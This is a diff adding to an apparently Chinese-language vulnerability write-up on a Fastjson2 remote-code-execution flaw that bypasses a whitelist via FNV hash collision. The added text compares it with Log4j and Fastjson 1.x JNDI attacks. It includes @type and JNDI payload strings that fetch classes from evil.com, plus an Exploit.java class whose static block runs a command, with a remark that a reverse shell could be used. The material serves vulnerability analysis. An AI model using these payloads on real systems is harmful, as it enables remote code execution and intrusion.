@@ -885,6 +885,35 @@ for (int i = 0; i < typeName.length(); i++) {
 6. loadClass(typeName) → 类加载器解析恶意 URL → 远程加载 → RCE
 ```
 
+**构造的类名本身不是恶意代码，只是一个"类加载路径"：**
+
+```text
+普通类名：     "java.util.HashMap"                    → JVM 在本地 classpath 找
+恶意类名：     "jar:http://evil.com/x!.Exploit"       → JVM 去 evil.com 下载 x.jar，从中加载 Exploit 类
+```
+
+这和 Log4j / Fastjson 1.x 的 JNDI 利用是同一个思路——最终都走到"让 JVM 去远程加载一个类，`static{}` 执行恶意代码"，区别只是"怎么让 JVM 同意去加载"：
+
+| 漏洞 | 如何让 JVM 加载远程类 |
+|------|---------------------|
+| Log4j | `${jndi:rmi://evil.com/Exploit}` → JNDI 查询 → 远程加载 |
+| Fastjson 1.x ≤1.2.24 | `{"@type":"JdbcRowSetImpl","dataSourceName":"rmi://..."}` → JNDI 查询 → 远程加载 |
+| Fastjson 1.x CVE-2026-16723 | `{"@type":"jar:http://evil.com/probe.jar!.Exploit"}` → @JSONType 信任 → 直接远程加载 |
+| **Fastjson2 RCE** | `{"@type":"jar:http://evil.com/x!.Exploit"}` → **FNV 哈希碰撞绕过白名单** → 直接远程加载 |
+
+VPS 上只需准备一个普通 Java 类，`static{}` 里写恶意代码：
+
+```java
+// Exploit.java — 放在 VPS 的 HTTP 服务目录下，等着目标 JVM 来下载
+public class Exploit {
+    static {
+        try {
+            Runtime.getRuntime().exec("calc");  // 或反弹 shell
+        } catch (Exception e) {}
+    }
+}
+```
+
 **攻击向量（从补丁测试用例逆向）：**
 
 ```text
